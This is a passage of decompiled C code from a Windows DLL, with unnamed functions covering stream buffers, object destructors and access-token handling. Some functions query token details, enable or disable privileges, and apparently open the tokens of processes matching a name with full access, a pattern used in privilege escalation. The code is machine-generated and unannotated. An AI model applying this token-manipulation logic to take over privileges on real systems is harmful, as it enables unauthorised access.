    return (*(int (__thiscall **)(_DWORD *, unsigned int))(*this + 44))(this, result);
  }
  return result;
}

//----- (1001AE43) --------------------------------------------------------
void __thiscall sub_1001AE43(_DWORD *this, void *a2)
{
  int v3; // ecx
  void *v4; // eax
  const void *v5; // [esp-8h] [ebp-34h]
  size_t v6; // [esp-4h] [ebp-30h]
  int v7[5]; // [esp+Ch] [ebp-20h] BYREF
  int v8; // [esp+28h] [ebp-4h]

  sub_1000B1F3(a2, (int)v7, 0);
  v8 = 0;
  v6 = this[7];
  v5 = (const void *)sub_1000B4B8(this + 2);
  v4 = (void *)sub_1000B49B(v7, v3);
  memcpy(v4, v5, v6);
  *(_BYTE *)(v7[1] + 8) = 1;
  sub_1000B3BD(v7, (int)(this + 2));
  v8 = -1;
  sub_1000B3DF(v7);
}
// 1001AE78: variable 'v3' is possibly undefined

//----- (1001AEB1) --------------------------------------------------------
int __userpurge sub_1001AEB1@<eax>(_DWORD *a1@<ebx>, int a2)
{
  *(_BYTE *)(a2 + 4) = 0;
  *(_DWORD *)a2 = &off_10102AF8;
  sub_1000B36F(a1, a2 + 8);
  *(_DWORD *)(a2 + 28) = 0;
  return a2;
}
// 10102AF8: using guessed type int (__thiscall *off_10102AF8)(void *Block, char);

//----- (1001AEF3) --------------------------------------------------------
void *__thiscall sub_1001AEF3(void *Block, char a2)
{
  sub_1001AF12((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001AF12) --------------------------------------------------------
void *__thiscall sub_1001AF12(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_10102AF8;
  *(_BYTE *)(this + 4) = 1;
  v4 = 0;
  sub_1000B3DF((int *)(this + 8));
  v4 = -1;
  return sub_1001170B((_BYTE *)this);
}
// 10102AF8: using guessed type int (__thiscall *off_10102AF8)(void *Block, char);

//----- (1001AF77) --------------------------------------------------------
int __thiscall sub_1001AF77(int *this, _BYTE *a2)
{
  int v3; // ecx

  if ( (*(unsigned __int8 (__thiscall **)(int *))(*this + 28))(this) )
    return 0;
  *a2 = *(_BYTE *)sub_1000B4CB((int)(this + 2), v3, this[7]++);
  return 1;
}
// 1001AF90: variable 'v3' is possibly undefined

//----- (1001AFA7) --------------------------------------------------------
size_t __thiscall sub_1001AFA7(_DWORD *this, _DWORD *a2)
{
  unsigned int v5; // ebx
  size_t v6; // ebx
  int v7; // ecx
  void *v8; // eax
  const void *v9; // [esp-10h] [ebp-14h]
  char v10; // [esp+Fh] [ebp+Bh]

  if ( (*(unsigned __int8 (__thiscall **)(_DWORD *))(*this + 28))(this) )
    return 0;
  v5 = a2[3];
  if ( v5 >= (*(int (__thiscall **)(_DWORD *))(*this + 24))(this) )
    v6 = (*(int (__thiscall **)(_DWORD *))(*this + 24))(this);
  else
    v6 = a2[3];
  v10 = *(_BYTE *)(a2[1] + 8);
  v9 = (const void *)(this[7] + sub_1000B4B8(this + 2));
  v8 = (void *)sub_1000B49B(a2, v7);
  memcpy(v8, v9, v6);
  if ( v10 )
    *(_BYTE *)(a2[1] + 8) = 1;
  this[7] += v6;
  return v6;
}
// 1001AFF3: variable 'v7' is possibly undefined

//----- (1001B01A) --------------------------------------------------------
int __thiscall sub_1001B01A(_DWORD *this)
{
  return this[5] - this[7];
}

//----- (1001B021) --------------------------------------------------------
BOOL __thiscall sub_1001B021(void *this)
{
  return (*(int (__thiscall **)(void *))(*(_DWORD *)this + 24))(this) == 0;
}

//----- (1001B02C) --------------------------------------------------------
int __thiscall sub_1001B02C(_DWORD *this, int a2)
{
  sub_1000B36F(this + 2, a2);
  return a2;
}

//----- (1001B064) --------------------------------------------------------
void __thiscall sub_1001B064(_DWORD *this)
{
  this[7] = 0;
}

//----- (1001B069) --------------------------------------------------------
int __thiscall sub_1001B069(_DWORD *this)
{
  return this[7];
}

//----- (1001B06D) --------------------------------------------------------
int __thiscall sub_1001B06D(_DWORD *this, int a2, int a3)
{
  int v3; // eax
  int result; // eax
  int v5; // eax
  char v6[8]; // [esp+0h] [ebp-14h] BYREF
  int v7; // [esp+10h] [ebp-4h]

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = this[7];
    }
    else if ( a3 == 2 )
    {
      v3 = this[5];
    }
  }
  else
  {
    v3 = 0;
  }
  result = a2 + v3;
  if ( result < 0 || result > this[5] )
  {
    v5 = sub_1000E88D((int)v6, 1, 0);
    v7 = 0;
    sub_10012582(v5, 101);
  }
  this[7] = result;
  return result;
}
// 1001B06D: using guessed type char var_14[8];

//----- (1001B0CD) --------------------------------------------------------
_DWORD *__thiscall sub_1001B0CD(void *this, _DWORD *a2)
{
  sub_100201A0(this, (int)a2, 1);
  *a2 = &off_10102B30;
  sub_1000B1F3((void *)8, (int)(a2 + 4), 0);
  return a2;
}
// 10102B30: using guessed type int (__thiscall *off_10102B30)(void *Block, char);

//----- (1001B112) --------------------------------------------------------
void *__thiscall sub_1001B112(void *Block, char a2)
{
  sub_1001B131((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001B131) --------------------------------------------------------
void *__thiscall sub_1001B131(int this)
{
  _DWORD v3[5]; // [esp+0h] [ebp-20h] BYREF
  int v4; // [esp+1Ch] [ebp-4h]

  v3[4] = v3;
  v3[3] = this;
  *(_DWORD *)this = &off_10102B30;
  v4 = 2;
  sub_10020227((_BYTE *)this);
  v4 = 0;
  sub_1000B3DF((int *)(this + 16));
  v4 = -1;
  return sub_100201D0((_BYTE *)this);
}
// 10102B30: using guessed type int (__thiscall *off_10102B30)(void *Block, char);

//----- (1001B198) --------------------------------------------------------
char __fastcall sub_1001B198(int a1)
{
  char v2; // [esp+1h] [ebp-1h] BYREF

  v2 = HIBYTE(a1);
  (*(void (__stdcall **)(char *, int))(*(_DWORD *)a1 + 88))(&v2, 1);
  return v2;
}

//----- (1001B1AC) --------------------------------------------------------
bool __thiscall sub_1001B1AC(void *this)
{
  unsigned __int8 v1; // al
  int v2; // eax
  char v4[8]; // [esp+0h] [ebp-14h] BYREF
  int v5; // [esp+10h] [ebp-4h]

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 52))(this);
  if ( v1 >= 2u )
  {
    v2 = sub_1000E88D((int)v4, 1, 0);
    v5 = 0;
    sub_10012582(v2, 36);
  }
  return v1 == 1;
}
// 1001B1AC: using guessed type char var_14[8];

//----- (1001B1F3) --------------------------------------------------------
__int16 __thiscall sub_1001B1F3(void *this)
{
  void *v2; // [esp+0h] [ebp-4h] BYREF

  v2 = this;
  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 88))(this, &v2, 2);
  return (__int16)v2;
}

//----- (1001B208) --------------------------------------------------------
int __thiscall sub_1001B208(void *this)
{
  void *v2; // [esp+0h] [ebp-4h] BYREF

  v2 = this;
  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 88))(this, &v2, 4);
  return (int)v2;
}

//----- (1001B21C) --------------------------------------------------------
double __thiscall sub_1001B21C(void *this)
{
  double v2; // [esp+0h] [ebp-8h] BYREF

  (*(void (__thiscall **)(void *, double *, int))(*(_DWORD *)this + 88))(this, &v2, 8);
  return v2;
}

//----- (1001B231) --------------------------------------------------------
__int64 __thiscall sub_1001B231(void *this)
{
  __int64 v2; // [esp+0h] [ebp-8h] BYREF

  (*(void (__thiscall **)(void *, __int64 *, int))(*(_DWORD *)this + 88))(this, &v2, 8);
  return v2;
}

//----- (1001B249) --------------------------------------------------------
int __thiscall sub_1001B249(void *this, int a2)
{
  (*(void (__thiscall **)(void *, int, int))(*(_DWORD *)this + 88))(this, a2, 8);
  return a2;
}

//----- (1001B25D) --------------------------------------------------------
LONG *__thiscall sub_1001B25D(void *this, LONG *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  int v6[5]; // [esp+8h] [ebp-40h] BYREF
  int v7[3]; // [esp+1Ch] [ebp-2Ch] BYREF
  unsigned int v8; // [esp+28h] [ebp-20h]
  int v9[2]; // [esp+30h] [ebp-18h] BYREF
  int v10; // [esp+38h] [ebp-10h]
  int v11; // [esp+44h] [ebp-4h]

  v11 = 0;
  v10 = 0;
  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 84))(this, v7, 1);
  v11 = 1;
  sub_1000D17D(a2, &word_10179B8C);
  v10 = 1;
  if ( v8 >= 4 && sub_1000B6F2(v7, 0) == 0xFFFF )
  {
    v2 = (_DWORD *)sub_1000B6B7(v7, (int)v6, 4, v8 - 4);
    LOBYTE(v11) = 3;
    v3 = sub_1000D230(v2, v9);
    LOBYTE(v11) = 4;
    sub_10001236(v3 + 1, a2 + 1);
    LOBYTE(v11) = 3;
    sub_1000D3AD(v9);
    LOBYTE(v11) = 1;
    sub_1000B3DF(v6);
  }
  else
  {
    v4 = sub_1000D2FA(v9, 0);
    LOBYTE(v11) = 2;
    sub_10001236(v4 + 1, a2 + 1);
    LOBYTE(v11) = 1;
    sub_1000D3AD(v9);
  }
  LOBYTE(v11) = 0;
  sub_1000B3DF(v7);
  return a2;
}
// 1001B25D: using guessed type int var_2C[3];
// 1001B25D: using guessed type int var_40[5];

//----- (1001B341) --------------------------------------------------------
_DWORD *__thiscall sub_1001B341(int *this, _DWORD *a2, char a3)
{
  void *v4; // eax
  int v5; // eax
  int v6; // ecx
  int v7; // eax
  char v9[8]; // [esp+8h] [ebp-18h] BYREF
  int v10; // [esp+10h] [ebp-10h]
  int v11; // [esp+1Ch] [ebp-4h]

  v11 = 0;
  v10 = 0;
  v4 = (void *)(*(int (__thiscall **)(int *))(*this + 64))(this);
  if ( (unsigned int)v4 > 0x8000000 )
  {
    v5 = sub_1000E88D((int)v9, 1, 0);
    v11 = 1;
    sub_10012582(v5, 92);
  }
  sub_1000B1F3(v4, (int)a2, 0);
  v11 = 0;
  v10 = 1;
  sub_1000B79B(v6, a2);
  v7 = *this;
  if ( a3 )
    (*(void (__thiscall **)(int *, _DWORD *))(v7 + 20))(this, a2);
  else
    (*(void (__thiscall **)(int *, _DWORD *))(v7 + 12))(this, a2);
  return a2;
}
// 1001B395: variable 'v6' is possibly undefined
// 1001B341: using guessed type char var_18[8];

//----- (1001B3C0) --------------------------------------------------------
void __thiscall sub_1001B3C0(_DWORD *this, void *Destination, rsize_t DestinationSize)
{
  _DWORD *v3; // esi
  rsize_t v4; // eax
  LONG *v5; // eax
  _DWORD *v6; // eax
  int v7; // eax
  const void *v8; // eax
  int v9[5]; // [esp+Ch] [ebp-38h] BYREF
  int v10[2]; // [esp+20h] [ebp-24h] BYREF
  int v11[3]; // [esp+28h] [ebp-1Ch] BYREF
  _DWORD *v12; // [esp+34h] [ebp-10h]
  int v13; // [esp+40h] [ebp-4h]

  v3 = this;
  v4 = this[7];
  v12 = this;
  if ( DestinationSize > v4 )
  {
    v5 = (LONG *)sub_1000B1F3((void *)DestinationSize, (int)v10, 0);
    v13 = 0;
    sub_1000B3BD(v5, (int)(v3 + 4));
    v13 = -1;
    sub_1000B3DF(v10);
    v3 = v12;
  }
  if ( DestinationSize == 1 )
  {
    if ( !(*(int (__thiscall **)(_DWORD *, void *))(*v3 + 16))(v3, Destination) )
    {
      v6 = sub_10011653(v11);
      v13 = 1;
      sub_100117C0((int)v6, 117);
    }
  }
  else
  {
    sub_1000B6B7(v3 + 4, (int)v9, 0, DestinationSize);
    v13 = 2;
    v7 = (*(int (__thiscall **)(_DWORD *))(*v3 + 44))(v3);
    (*(void (__thiscall **)(int, int *))(*(_DWORD *)v7 + 20))(v7, v9);
    v8 = (const void *)sub_1000B4B8(v9);
    memcpy_s(Destination, DestinationSize, v8, DestinationSize);
    v13 = -1;
    sub_1000B3DF(v9);
  }
}
// 1001B3C0: using guessed type int var_1C[3];
// 1001B3C0: using guessed type int var_38[5];

//----- (1001B492) --------------------------------------------------------
int __thiscall sub_1001B492(_BYTE *this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  v2[6] = 0;
  return sub_1001B4C9(this);
}

//----- (1001B4C9) --------------------------------------------------------
int __thiscall sub_1001B4C9(_BYTE *this)
{
  int result; // eax

  result = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 28))(this);
  if ( !(_BYTE)result )
    this[4] = 1;
  return result;
}

//----- (1001B4DC) --------------------------------------------------------
char __thiscall sub_1001B4DC(_BYTE *this)
{
  return this[4];
}

//----- (1001B4E0) --------------------------------------------------------
void __thiscall sub_1001B4E0(_DWORD *this)
{
  DWORD v2; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-1Ch]

  *this = &off_10102B8C;
  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  sub_10011AF4((int)(this + 1), (void *)0xFFFFFFFF, 0, 0, v2, CurrentProcessId);
}
// 10102B8C: using guessed type int (__thiscall *off_10102B8C)(void *, char);

//----- (1001B526) --------------------------------------------------------
_DWORD *__stdcall sub_1001B526(_DWORD *a1, void *a2)
{
  DWORD v2; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-18h]

  *a1 = &off_10102B8C;
  CurrentProcessId = GetCurrentProcessId();
  v2 = GetCurrentProcessId();
  sub_10011AF4((int)(a1 + 1), a2, 0, 0, v2, CurrentProcessId);
  return a1;
}
// 10102B8C: using guessed type int (__thiscall *off_10102B8C)(void *, char);

//----- (1001B56C) --------------------------------------------------------
void __thiscall sub_1001B56C(_DWORD *this)
{
  *this = &off_10102B8C;
  sub_1000A159(this + 1);
}
// 10102B8C: using guessed type int (__thiscall *off_10102B8C)(void *, char);

//----- (1001B598) --------------------------------------------------------
int __thiscall sub_1001B598(_DWORD *this)
{
  void *v1; // ecx
  _DWORD *v2; // eax
  int v4[3]; // [esp+0h] [ebp-20h] BYREF
  int TokenInformation; // [esp+Ch] [ebp-14h] BYREF
  DWORD ReturnLength[4]; // [esp+10h] [ebp-10h] BYREF

  v1 = (void *)this[2];
  ReturnLength[0] = 0;
  if ( !GetTokenInformation(v1, TokenType, &TokenInformation, 4u, ReturnLength) )
  {
    v2 = sub_1000E9DF(v4, 1, 1);
    ReturnLength[3] = 0;
    sub_1000A947(v2, 86);
  }
  return TokenInformation;
}
// 1001B598: using guessed type int var_20[3];

//----- (1001B5EA) --------------------------------------------------------
int __thiscall sub_1001B5EA(_DWORD *this)
{
  void *v1; // ecx
  _DWORD *v2; // eax
  int v4[3]; // [esp+0h] [ebp-20h] BYREF
  int TokenInformation; // [esp+Ch] [ebp-14h] BYREF
  DWORD ReturnLength[4]; // [esp+10h] [ebp-10h] BYREF

  v1 = (void *)this[2];
  ReturnLength[0] = 0;
  if ( !GetTokenInformation(v1, TokenImpersonationLevel, &TokenInformation, 4u, ReturnLength) )
  {
    v2 = sub_1000E9DF(v4, 1, 1);
    ReturnLength[3] = 0;
    sub_1000A947(v2, 95);
  }
  return TokenInformation;
}
// 1001B5EA: using guessed type int var_20[3];

//----- (1001B63C) --------------------------------------------------------
void __userpurge sub_1001B63C(int a1@<eax>, int a2)
{
  void *v2; // edi
  DWORD v3; // eax
  DWORD CurrentProcessId; // [esp-4h] [ebp-Ch]

  v2 = *(void **)(a1 + 8);
  CurrentProcessId = GetCurrentProcessId();
  v3 = GetCurrentProcessId();
  sub_1000A198((HANDLE *)(a2 + 4), v2, 1, 0, v3, CurrentProcessId);
}

//----- (1001B666) --------------------------------------------------------
int __userpurge sub_1001B666@<eax>(int a1@<eax>, int a2)
{
  if ( a2 != a1 )
    sub_1001B63C(a1, a2);
  return a2;
}

//----- (1001B67D) --------------------------------------------------------
int __thiscall sub_1001B67D(_DWORD *this, int a2)
{
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  void *v5; // edi
  int v6; // ecx
  void *v7; // eax
  _DWORD *v8; // eax
  unsigned __int8 **v9; // eax
  void *v11; // [esp-14h] [ebp-54h]
  DWORD v12; // [esp-8h] [ebp-48h]
  int v13[5]; // [esp+Ch] [ebp-34h] BYREF
  _DWORD v14[3]; // [esp+20h] [ebp-20h] BYREF
  int v15; // [esp+2Ch] [ebp-14h]
  DWORD ReturnLength; // [esp+30h] [ebp-10h] BYREF
  int v17; // [esp+3Ch] [ebp-4h]

  v15 = 0;
  v11 = (void *)this[2];
  ReturnLength = 0;
  if ( GetTokenInformation(v11, TokenUser, 0, 0, &ReturnLength) )
  {
    v3 = sub_1000E9DF(v14, 1, 1);
    v17 = 1;
    sub_1000A947(v3, 125);
  }
  if ( GetLastError() != 122 )
  {
    v4 = sub_1000E9DF(v14, 1, 1);
    v17 = 2;
    sub_1000A947(v4, 126);
  }
  sub_1000B1F3((void *)ReturnLength, (int)v13, 0);
  v17 = 3;
  v5 = (void *)this[2];
  v12 = v13[3];
  v7 = (void *)sub_1000B49B(v13, v6);
  if ( !GetTokenInformation(v5, TokenUser, v7, v12, &ReturnLength) )
  {
    v8 = sub_1000E9DF(v14, 1, 1);
    LOBYTE(v17) = 4;
    sub_1000A947(v8, 131);
  }
  *(_BYTE *)(v13[1] + 8) = 1;
  v9 = (unsigned __int8 **)sub_1000B4B8(v13);
  sub_10021171(a2, *v9);
  v15 = 1;
  LOBYTE(v17) = 0;
  sub_1000B3DF(v13);
  return a2;
}
// 1001B70A: variable 'v6' is possibly undefined
// 1001B67D: using guessed type _DWORD var_20[3];

//----- (1001B76B) --------------------------------------------------------
_DWORD *__thiscall sub_1001B76B(void *this, _DWORD *a2)
{
  int v2; // eax
  void *v4[3]; // [esp+4h] [ebp-1Ch] BYREF
  int v5; // [esp+10h] [ebp-10h]
  int v6; // [esp+1Ch] [ebp-4h]

  v5 = 0;
  v2 = (*(int (__thiscall **)(void *, void **))(*(_DWORD *)this + 12))(this, v4);
  v6 = 1;
  sub_10021411(v2, a2);
  v5 = 1;
  LOBYTE(v6) = 0;
  sub_1002124C(v4);
  return a2;
}

//----- (1001B7B6) --------------------------------------------------------
_DWORD *__thiscall sub_1001B7B6(void *this, _DWORD *a2)
{
  DWORD v2; // eax
  void *v4[3]; // [esp+4h] [ebp-1Ch] BYREF
  int v5; // [esp+10h] [ebp-10h]
  int v6; // [esp+1Ch] [ebp-4h]

  v5 = 0;
  v2 = (*(int (__thiscall **)(void *, void **))(*(_DWORD *)this + 12))(this, v4);
  v6 = 1;
  sub_10021278(v2, a2);
  v5 = 1;
  LOBYTE(v6) = 0;
  sub_1002124C(v4);
  return a2;
}

//----- (1001B801) --------------------------------------------------------
int *__cdecl sub_1001B801(int *a1)
{
  LONG *v1; // esi
  int v2; // eax
  LONG *v3; // eax
  LONG *v4; // eax
  LONG *v5; // eax
  int v6; // eax
  unsigned int j; // esi
  DWORD v8; // ebx
  _DWORD *v9; // eax
  int v10; // eax
  int v12[3]; // [esp+10h] [ebp-5Ch] BYREF
  unsigned int v13; // [esp+1Ch] [ebp-50h]
  int v14[3]; // [esp+20h] [ebp-4Ch] BYREF
  unsigned int v15; // [esp+2Ch] [ebp-40h]
  int v16; // [esp+30h] [ebp-3Ch] BYREF
  int v17[2]; // [esp+34h] [ebp-38h] BYREF
  int v18; // [esp+3Ch] [ebp-30h] BYREF
  int v19[2]; // [esp+40h] [ebp-2Ch] BYREF
  int v20[2]; // [esp+48h] [ebp-24h] BYREF
  _DWORD *v21; // [esp+50h] [ebp-1Ch]
  int v22; // [esp+54h] [ebp-18h]
  unsigned int i; // [esp+58h] [ebp-14h]
  bool v24; // [esp+5Fh] [ebp-Dh]
  int v25; // [esp+68h] [ebp-4h]

  *a1 = (int)off_100FBF5C;
  *a1 = (int)&off_10102BB0;
  sub_1001C69F(a1);
  v25 = 0;
  v22 = 1;
  sub_1001BAF3(v12);
  v25 = 3;
  sub_10020F2E(v14);
  LOBYTE(v25) = 4;
  for ( i = 0; i < v15; ++i )
  {
    v1 = sub_1000D372(v17, (int)&unk_10186968);
    LOBYTE(v25) = 5;
    v2 = (*(int (__thiscall **)(int *, unsigned int))(v14[0] + 44))(v14, i);
    v3 = sub_10020EF4(v2, v19);
    LOBYTE(v25) = 6;
    v4 = sub_1000D9B4(v3);
    v21 = sub_1000D372(v20, (int)v4);
    LOBYTE(v25) = 7;
    v5 = sub_1000D9B4(v1);
    v24 = sub_1000DF11(0, (int)v21, (int)v5) != -1;
    LOBYTE(v25) = 6;
    sub_1000D3AD(v20);
    LOBYTE(v25) = 5;
    sub_1000D3AD(v19);
    LOBYTE(v25) = 4;
    sub_1000D3AD(v17);
    if ( v24 )
    {
      v6 = (*(int (__thiscall **)(int *, unsigned int))(v14[0] + 44))(v14, i);
      sub_10052660(v12, v6);
    }
  }
  for ( j = 0; j < v13; ++j )
  {
    v8 = *(_DWORD *)(*(int (__thiscall **)(int *, unsigned int))(v12[0] + 44))(v12, j);
    v9 = sub_1001CA35(v8, &v18, 0x400u);
    LOBYTE(v25) = 8;
    v10 = (*(int (__thiscall **)(_DWORD *, int *, int))(*v9 + 32))(v9, &v16, 983551);
    LOBYTE(v25) = 9;
    sub_10015925(a1, v10);
    LOBYTE(v25) = 8;
    sub_1001B56C(&v16);
    LOBYTE(v25) = 4;
    sub_100128CB(&v18);
  }
  LOBYTE(v25) = 3;
  sub_1001BB30(v14);
  LOBYTE(v25) = 0;
  sub_1001BB30(v12);
  return a1;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10102BB0: using guessed type int (__thiscall *off_10102BB0)(void *Block, char);

//----- (1001B9A0) --------------------------------------------------------
DWORD __fastcall sub_1001B9A0(int a1, int a2, int a3)
{
  return sub_1001B9C4(1, a2, a1, a3);
}

//----- (1001B9B2) --------------------------------------------------------
DWORD __fastcall sub_1001B9B2(int a1, int a2, int a3)
{
  return sub_1001B9C4(0, a2, a1, a3);
}

//----- (1001B9C4) --------------------------------------------------------
DWORD __fastcall sub_1001B9C4(char a1, int a2, int a3, int a4)
{
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  DWORD result; // eax
  _DWORD *v8; // eax
  void *v9; // [esp-18h] [ebp-54h]
  struct _TOKEN_PRIVILEGES NewState; // [esp+Ch] [ebp-30h] BYREF
  _DWORD v11[3]; // [esp+1Ch] [ebp-20h] BYREF
  struct _LUID Luid; // [esp+28h] [ebp-14h] BYREF
  int v13; // [esp+38h] [ebp-4h]

  Luid.LowPart = 0;
  Luid.HighPart = 0;
  memset(&NewState, 0, sizeof(NewState));
  if ( !LookupPrivilegeValueW(0, *(LPCWSTR *)(*(_DWORD *)(a4 + 4) + 12), &Luid) )
  {
    v5 = sub_1000E9DF(v11, 1, 1);
    v13 = 0;
    sub_1000A947(v5, 213);
  }
  NewState.Privileges[0].Luid = Luid;
  v9 = *(void **)(a3 + 8);
  NewState.PrivilegeCount = 1;
  NewState.Privileges[0].Attributes = a1 != 0 ? 2 : 0;
  if ( !AdjustTokenPrivileges(v9, 0, &NewState, 0x10u, 0, 0) )
  {
    v6 = sub_1000E9DF(v11, 1, 1);
    v13 = 1;
    sub_1000A947(v6, 218);
  }
  result = GetLastError();
  if ( result )
  {
    v8 = sub_1000E9DF(v11, 1, 1);
    v13 = 2;
    sub_1000A947(v8, 220);
  }
  return result;
}
// 1001B9C4: using guessed type _DWORD var_20[3];

//----- (1001BA98) --------------------------------------------------------
void __thiscall sub_1001BA98(void *this)
{
  void *v1; // eax
  int v2; // [esp+0h] [ebp-20h] BYREF
  void *Block; // [esp+Ch] [ebp-14h]
  int *v4; // [esp+10h] [ebp-10h]
  int v5; // [esp+1Ch] [ebp-4h]

  v4 = &v2;
  *(_DWORD *)this = off_10102C50;
  v5 = 0;
  v1 = (void *)*((_DWORD *)this + 1);
  if ( v1 )
  {
    Block = (void *)*((_DWORD *)this + 1);
    LOBYTE(v5) = 0;
    sub_10020B81(v1);
    j__free(Block);
  }
}
// 10102C50: using guessed type int (__thiscall *off_10102C50[2])(void *Block, char);

//----- (1001BAF3) --------------------------------------------------------
_DWORD *__stdcall sub_1001BAF3(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_100FBF5C;
  *a1 = &off_10102C10;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  return result;
}
// 100FBF5C: using guessed type int (__thiscall *off_100FBF5C[2])(void *Block, char);
// 10102C10: using guessed type int (__thiscall *off_10102C10)(void *Block, char);

//----- (1001BB30) --------------------------------------------------------
void *__thiscall sub_1001BB30(_DWORD *this)
{
  _DWORD *i; // eax
  _DWORD *v3; // edi
  _DWORD v5[5]; // [esp+0h] [ebp-20h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v5[4] = v5;
  v5[3] = this;
  *this = &off_10102C10;
  v6 = 1;
  for ( i = (_DWORD *)this[1]; i; i = v3 )
  {
    v3 = (_DWORD *)i[4];
    sub_1001BD7A(i);
  }
  v6 = -1;
  return sub_100185A9(this);
}
// 10102C10: using guessed type int (__thiscall *off_10102C10)(void *Block, char);

//----- (1001BB96) --------------------------------------------------------
_DWORD *__thiscall sub_1001BB96(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[1];
    v3[2] = 0;
    v3[1] = this;
    *v3 = &off_10102C54;
    v3[3] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10102C54: using guessed type int (__thiscall *off_10102C54)(void *Block, char);

//----- (1001BBFC) --------------------------------------------------------
_DWORD *__thiscall sub_1001BBFC(_DWORD *this, _DWORD *a2)
{
  _DWORD *v3; // eax
  int v4; // ecx

  v3 = operator new(0x10u);
  if ( v3 )
  {
    v4 = this[2];
    v3[3] = 0;
    v3[1] = this;
    *v3 = &off_10102C54;
    v3[2] = v4;
  }
  else
  {
    v3 = 0;
  }
  sub_10050B91(a2, (int)v3);
  return a2;
}
// 10102C54: using guessed type int (__thiscall *off_10102C54)(void *Block, char);

//----- (1001BC62) --------------------------------------------------------
_DWORD *__thiscall sub_1001BC62(void *this, _DWORD *a2, unsigned int a3)
{
  int v3; // edi
  unsigned int v5; // eax
  _DWORD *v6; // eax
  int v7; // esi
  int v9; // [esp+Ch] [ebp-14h] BYREF
  int v10; // [esp+10h] [ebp-10h]
  int v11; // [esp+1Ch] [ebp-4h]

  v3 = 0;
  v11 = 0;
  v10 = 0;
  v5 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( a3 > v5 )
  {
    v6 = sub_1000E8EF(&a3);
    v11 = 1;
    goto LABEL_3;
  }
  (*(void (__thiscall **)(void *, _DWORD *))(*(_DWORD *)this + 12))(this, a2);
  v11 = 0;
  v10 = 1;
  if ( a3 )
  {
    while ( 1 )
    {
      v7 = *a2;
      if ( (*(unsigned __int8 (__thiscall **)(_DWORD))(*(_DWORD *)*a2 + 4))(*a2) )
        break;
      (*(void (__thiscall **)(int))(*(_DWORD *)v7 + 16))(v7);
      if ( ++v3 >= a3 )
        return a2;
    }
    v6 = sub_1000E8EF(&v9);
    v11 = 2;
LABEL_3:
    sub_100078FE((int)v6);
  }
  return a2;
}

//----- (1001BCF8) --------------------------------------------------------
int __thiscall sub_1001BCF8(void *this, int a2)
{
  int v2; // esi
  void *v4[2]; // [esp+4h] [ebp-14h] BYREF
  int v5; // [esp+14h] [ebp-4h]

  (*(void (__thiscall **)(void *, void **, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1002228F(v4);
  return v2;
}

//----- (1001BD3C) --------------------------------------------------------
void *__thiscall sub_1001BD3C(void *Block, char a2)
{
  sub_1001BA98(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001BD5B) --------------------------------------------------------
_DWORD *__thiscall sub_1001BD5B(_DWORD *Block, char a2)
{
  sub_1001BB30(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1001BD7A) --------------------------------------------------------
void *__stdcall sub_1001BD7A(void *Block)
{
  sub_1001BDAA((int)Block);
  j__free(Block);
  return Block;
}

//----- (1001BDAA) --------------------------------------------------------
void __stdcall sub_1001BDAA(int a1)
{
  sub_1000D3AD((int *)(a1 + 8));
}

//----- (1001BDD1) --------------------------------------------------------
int __thiscall sub_1001BDD1(_DWORD *this)
{
  int result; // eax
  _DWORD *v2; // eax
  _DWORD v3[4]; // [esp+0h] [ebp-10h] BYREF

  v3[0] = this;
  result = this[3];
  if ( !result )
  {
    v2 = sub_1000E8EF(v3);
    v3[3] = 0;
    sub_100078FE((int)v2);
  }
  return result;
}

//----- (1001BE07) --------------------------------------------------------
int __thiscall sub_1001BE07(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[3];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 16);
  this[3] = result;
  return result;
}

//----- (1001BE46) --------------------------------------------------------
int __thiscall sub_1001BE46(_DWORD *this)
{
  int v1; // eax
  _DWORD *v2; // eax
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  v4[0] = this;
  v1 = this[2];
  if ( !v1 )
  {
    v2 = sub_1000E8EF(v4);
    v4[3] = 0;
    sub_100078FE((int)v2);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 20);
  this[2] = result;
  return result;
}

//----- (1001BE85) --------------------------------------------------------
